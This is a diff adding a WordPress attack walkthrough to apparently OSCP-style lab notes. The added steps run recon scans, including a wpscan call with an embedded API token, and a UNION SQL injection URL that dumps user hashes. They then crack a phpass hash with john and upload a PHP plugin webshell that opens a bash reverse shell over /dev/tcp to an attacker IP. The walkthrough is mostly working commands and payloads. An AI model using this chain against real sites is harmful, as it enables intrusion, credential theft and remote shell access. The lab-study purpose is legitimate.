@@ -896,6 +896,36 @@
     `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec --tables --batch --threads=5`  
     Dump data for the table  
     `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec -T users --dump --batch --threads=5`  
+  - Wordpress vulnerable plugin - Unauthenticated SQL Injection
+    1. add etc/hosts: alvida-eatery.org
+    2. web vulnerability scan
+       - `nikto -h http://alvida-eatery.org`
+       - `whatweb http://alvida-eatery.org`
+       - `gobuster dir -u http://alvida-eatery.org -w /usr/share/wordlists/dirb/common.txt -t5`
+       - `wpscan --url http://alvida-eatery.org --api-token Cnwa5qbii36TyV5oHvnXnQObqC1CQAkJdPsaf5T8i0c`
+       - **Output: WordPress 6.0, wp-login.php found, [vulnerable plugin - Unauthenticated SQL Injection](https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad (Unauthenticated SQL Injection))**  
+    4. login portal disclose user 'admin'
+    5. PoC `http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
+password leak: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0`
+    6. Password leak: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0 (WordPress hash password~hahs.txt)
+    7. `john --format=phpass hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`: 'hulabaloo'
+    8. Login to wordpress portal   
+    9. Create a webshell plugin index.php-->plug.zip (change kali ip, unuse port 4444,8888)
+       ```
+       <?php
+		/**
+		* Author: Saeed Bala
+		* Plugin Name: PHP Code Plugin
+		* Description: Shell Through Plugins
+		* Version: 1.0
+		*/
+		exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.165/8888 0>&1'");
+		?>
+       ```      
+       `zip -r plug.zip index.php`  
+    11. `nc -nvlp 8888`
+    12. Navigate to http://alvida-eatery.org/wp-admin/plugins.php → Add New → Upload Plugin and upload plug.zip > install > activate plugin
+    13. netcat got response and find the flag `find / -name "flag.txt" 2>/dev/null`  
   - 
 
 ### Client-site attacks  
